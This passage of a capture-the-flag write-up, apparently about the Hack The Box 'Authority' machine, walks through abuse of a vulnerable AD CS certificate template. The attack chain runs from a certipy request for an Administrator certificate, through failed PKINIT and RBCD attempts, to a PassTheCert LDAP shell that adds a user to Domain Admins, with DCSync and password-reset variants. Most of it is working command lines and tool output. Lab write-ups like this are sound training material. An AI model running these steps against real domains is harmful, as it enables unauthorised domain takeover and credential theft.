+</span></span><span class="line"><span class="cl">DNSHostName          : authority.authority.htb
+</span></span><span class="line"><span class="cl">Enabled              : True
+</span></span><span class="line"><span class="cl">Name                 : AUTHORITY
+</span></span><span class="line"><span class="cl">ObjectClass          : computer
+</span></span><span class="line"><span class="cl">ObjectGUID           : 23c88ddb-c76e-41bd-8b75-dd04e08431cc
+</span></span><span class="line"><span class="cl">SamAccountName       : AUTHORITY$
+</span></span><span class="line"><span class="cl">serviceprincipalname : {HOST/AUTHORITY/htb.corp, ldap/AUTHORITY/ForestDnsZones.authority.htb, GC/AUTHORITY/htb.corp, ldap/AUTHORITY/DomainDnsZones.authority.htb...}
+</span></span><span class="line"><span class="cl">SID                  : S-1-5-21-622327497-3269355298-2248959698-1000
+</span></span><span class="line"><span class="cl">UserPrincipalName    :
+</span></span></code></pre></div><p>The <code>certify-ad</code> or <code>certify.exe</code> tool can be employed to obtain a certificate as <code>Administrator</code>. Given that the newly added computer lacks the DNSHostname attribute, it needs to be specified explicitly when requesting a new certificate. Additionally, when specifying the username, it needs to be <code>Abraxas$</code> because authenticated and domain-joined accounts have a <a href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/the-mysterious-case-of-the-a-k-a-dollar-sign-character-in-hybrid/ba-p/768326" target="_blank" rel="noreferrer"><code>$</code> sign appended to samAccountName</a>.</p>
+<p>Certipy flags include:</p>
+<ul>
+<li><code>-target</code> for specifying the target domain.</li>
+<li><code>-ca</code> for indicating the Certificate Authority Name.</li>
+<li><code>-upn</code> for specifying the target user, preferably a domain admin (Administrator).</li>
+<li><code>-dns</code> for setting the DNS to <code>authority.authority.htb</code> (used solely for certificate request).</li>
+<li><code>-template</code> for specifying the template to use (CorpVPN).</li>
+</ul>
+<blockquote>
+<p>Windows equivalent command -&gt;
+<code>certify.exe request /ca:&lt;$certificateAuthorityHost&gt; /template:&lt;$vulnerableCertificateTemplateName&gt; /altname:&lt;$adUserToImpersonate&gt;</code></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-u <span class="s1">&#39;Abraxas$&#39;</span> -p <span class="s1">&#39;Abraxas&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ca <span class="s1">&#39;AUTHORITY-CA&#39;</span> -target authority.htb <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-template CorpVPN
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Got error: Unknown DCE RPC fault status code: <span class="m">00000721</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Use -debug to print a stacktrace
+</span></span></code></pre></div><p>It seems that the commands encounter intermittent RPC errors, but the issue is resolved by retrying the command a few times. I&rsquo;m not entirely sure about the exact reason for this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-u <span class="s1">&#39;Abraxas$&#39;</span> -p <span class="s1">&#39;Abraxas&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ca <span class="s1">&#39;AUTHORITY-CA&#39;</span> -target authority.htb <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-template CorpVPN
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with multiple identifications
+</span></span><span class="line"><span class="cl">    UPN: <span class="s1">&#39;Administrator@authority.htb&#39;</span>
+</span></span><span class="line"><span class="cl">    DNS Host Name: <span class="s1">&#39;authority.authority.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved certificate and private key to <span class="s1">&#39;administrator_authority.pfx&#39;</span>
+</span></span></code></pre></div><p>After running the command multiple times, I was able to get a certificate for Administrator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy cert -pfx certipy/administrator_authority.pfx
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl">MIIGZDCCBUygAwIBAgITEwAAAANIw05iQpigHQAAAAAAAzANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl">ADBHMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJYXV0aG9y
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">-----BEGIN PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC3VxxDWy0NYcqv
+</span></span><span class="line"><span class="cl">I6GJoU2qOnvyFMceyVihlIB6E73PVkA03Xhz0wB0t3IWXFUaS0ZaZAle0Q32QOcj
+</span></span><span class="line"><span class="cl">&lt;--SNIP--&gt;
+</span></span><span class="line"><span class="cl">&lt;--SNIP--&gt;
+</span></span></code></pre></div><p>Attempting authentication with the Administrator&rsquo;s certificate results in a DC error: <code>KDC has no support for padata type</code>. This suggests that the <a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d#KDC_ERR_PADATA_TYPE_NOSUPP" target="_blank" rel="noreferrer">KDC lacks configuration for Kerberos authentication with certificates</a> or does not have the required Enhanced Key Usages (EKUs).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">❯ certipy auth -pfx administrator_authority.pfx
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Found multiple identifications in certificate
+</span></span><span class="line"><span class="cl">[*] Please select one:
+</span></span><span class="line"><span class="cl">    [0] UPN: &#39;Administrator@authority.htb&#39;
+</span></span><span class="line"><span class="cl">    [1] DNS Host Name: &#39;authority.authority.htb&#39;
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> 0
+</span></span><span class="line"><span class="cl">[*] Using principal: administrator@authority.htb
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+</span></span></code></pre></div><p>Attempting to obtain the Administrator&rsquo;s TGT with Rubeus results in a similar error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_ldap\Documents<span class="p">&gt;</span> .\Rubeus.exe asktgt /user:Administrator /certificate:administrator_authority.pfx /ptt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ______        _
+</span></span><span class="line"><span class="cl">  <span class="p">(</span>_____ \      <span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">   _____<span class="p">)</span> )_   _<span class="p">|</span> <span class="p">|</span>__  _____ _   _  ___
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>  __  /<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  _ \<span class="p">|</span> ___ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/___)
+</span></span><span class="line"><span class="cl">  <span class="p">|</span> <span class="p">|</span>  \ \<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_) ) ____<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>_<span class="p">|</span>   <span class="p">|</span>_<span class="p">|</span>____/<span class="p">|</span>____/<span class="p">|</span>_____)____/(___/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  v2.2.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Action: Ask TGT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using PKINIT with etype rc4_hmac and subject: CN=Abraxas$
+</span></span><span class="line"><span class="cl">[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;authority.htb\Administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Using domain controller: fe80::8856:b0bf:b6f3:1fad<span class="nv">%8</span>:88
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt;
+</span></span></code></pre></div><p>I came across another blog mentioning <a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html" target="_blank" rel="noreferrer">CVE-2022-26923</a>, which relied on RBCD. Despite bloodyAD indicating that <code>Abraxas$</code> could impersonate Authority, I wasn&rsquo;t able to get a ticket for impersonating Administrator. I&rsquo;m not entirely certain about the reason for this, but I suspect it might be a false positive.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ openssl pkcs12 -in administrator_authority.pfx  -out administrator_authority.pem -nodes
+</span></span><span class="line"><span class="cl">Enter Import Password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ bloodyAD -s -u <span class="s1">&#39;Abraxas$&#39;</span> -d authority.htb -c <span class="s1">&#39;:administrator_authority.pem&#39;</span> --host 10.10.11.222 add rbcd <span class="s1">&#39;AUTHORITY$&#39;</span> <span class="s1">&#39;ABRAXAS$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ABRAXAS$ can now impersonate users on AUTHORITY$ via S4U2Proxy
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ _ rdate -n 10.10.11.222
+</span></span><span class="line"><span class="cl">Mon Aug  <span class="m">7</span> 16:58:57 IST <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ getST.py -spn ldap/authority.htb -impersonate Administrator -dc-ip 10.10.11.222 <span class="s1">&#39;authority.htb/Abraxas$:Abraxas&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating Administrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Probably user Abraxas$ does not have constrained delegation permissions or impersonated user does not exist
+</span></span></code></pre></div><h3 id="passthecert-attack" class="relative group">PassTheCert Attack <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#passthecert-attack" aria-label="Anchor">#</a></span></h3><p>The remaining step involves attempting the PassTheCert attack, and I found an informative blog post <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" target="_blank" rel="noreferrer">here</a>. It can be used to:</p>
+<ul>
+<li>Elevate privileges, granting the user DCSync privileges.</li>
+<li>Modify the password for a certain user.</li>
+<li>Get a LDAP shell. With an admin certificate, I can also add an user to the domain admin group</li>
+</ul>
+<p>For this attack the certificate and the private keys need to be separate. Certipy&rsquo;s cert sub-command makes this process straightforward.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing certificate and  to <span class="s1">&#39;admin.crt&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ certipy cert -pfx administrator_authority.pfx -nocert -out admin.key
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing private key to <span class="s1">&#39;admin.key&#39;</span>
+</span></span></code></pre></div><p>Utilizing the <a href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python" target="_blank" rel="noreferrer">Python script from AlmondOffSec</a>, I was able to get an interactive LDAP shell. Given that the certificate belongs to Administrator, I can add the <code>svc_ldap</code> user to the <code>Domain Admins</code> group using the <code>add_user_to_group</code> command. Since this script uses Impacket under the hood, I can also add a new computer using the <code>add_computer</code> command within the script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -action ldap-shell -port <span class="m">636</span>
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add_user_to_group svc_ldap &#34;Domain Admins&#34;</span>
+</span></span><span class="line"><span class="cl">Adding user: svc_ldap to group Domain Admins result: OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># exit</span>
+</span></span></code></pre></div><p>Seems <code>svc_ldap</code> is now a part of the <code>Domain Admins</code> group, and hence have admin privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                                 <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="p">==========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                                   <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>            <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">580</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>                      <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span><span class="py">snip</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span><span class="py">snip</span><span class="p">...</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="s2">&#34;C:/Users/Administrator/Desktop/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-ar</span><span class="p">---</span>         <span class="mf">8</span><span class="p">/</span><span class="mf">6</span><span class="p">/</span><span class="mf">2023</span>  <span class="mf">11</span><span class="err">:</span><span class="mf">20</span> <span class="n">PM</span>             <span class="mf">34</span> <span class="n">root</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="s2">&#34;C:/Users/Administrator/Desktop/root.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">40522df19c024877ca5dc612219fc9fd</span>
+</span></span></code></pre></div><p>Alternatively, using the same script I can also change Administrator&rsquo;s password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -new-pass
+</span></span></code></pre></div><p>Another option is to grant <code>svc_ldap</code> DCSync rights and use <code>secretsdump.py</code> to dump the hashes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -elevate
+</span></span></code></pre></div><p><strong>Pwned!</strong></p>
+<!-- ![Pwned](./images/Pwned.png) -->
+<hr>
+<h1 id="related-links" class="relative group">Related Links <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#related-links" aria-label="Anchor">#</a></span></h1><ul>
+<li><a href="https://github.com/GhostPack/Certify" target="_blank" rel="noreferrer">GhostPack/Certify: Active Directory certificate abuse.</a></li>
+<li><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" rel="noreferrer">r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)</a></li>
+<li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noreferrer">ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse</a></li>
+<li><a href="https://tools.thehacker.recipes/impacket/examples/addcomputer.py" target="_blank" rel="noreferrer">addcomputer.py - The Hacker Tools</a></li>
+<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members</a></li>
+<li><a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d" target="_blank" rel="noreferrer">Certificates and Pwnage and Patches, Oh My! | by Will Schroeder | Posts By SpecterOps Team Members</a></li>
+<li><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" target="_blank" rel="noreferrer">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR</a></li>
+<li><a href="https://github.com/ly4k/Certipy/issues/64" target="_blank" rel="noreferrer">Help understanding limitations of &ldquo;KDC_ERR_PADATA_TYPE_NBSP&rdquo; · Issue #64 · ly4k/Certipy</a></li>
+<li><a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html" target="_blank" rel="noreferrer">bloodyAD and Certifried (CVE-2022-26923) | Total Recall</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin" target="_blank" rel="noreferrer">From Misconfigured Certificate Template to Domain Admin - Red Team Notes</a></li>
+<li><a href="https://github.com/dirkjanm/PKINITtools/" target="_blank" rel="noreferrer">dirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771" target="_blank" rel="noreferrer">4771(F) Kerberos pre-authentication failed. - Windows Security | Microsoft Learn</a></li>
+<li><a href="https://twitter.com/_nwodtuhs/status/1451510341041594377" target="_blank" rel="noreferrer">Charlie Bromberg: Kerberos basics &amp; (ab)use of Certificates within Active Directory (i.e. AD CS and PKINIT) - Kerberos 101 - Pass-the-Certificate - UnPAC-the-Hash - Shadow Credentials - AD CS escalation (ESC1 to ESC8)</a></li>
+<li><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" target="_blank" rel="noreferrer">Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Blog</a></li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=//localhost:1313/blog/htb-authority/&amp;text=HTB%20Authority"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/blog/htb-authority/&amp;title=HTB%20Authority"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/blog/htb-authority/&amp;resubmit=true&amp;title=HTB%20Authority"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 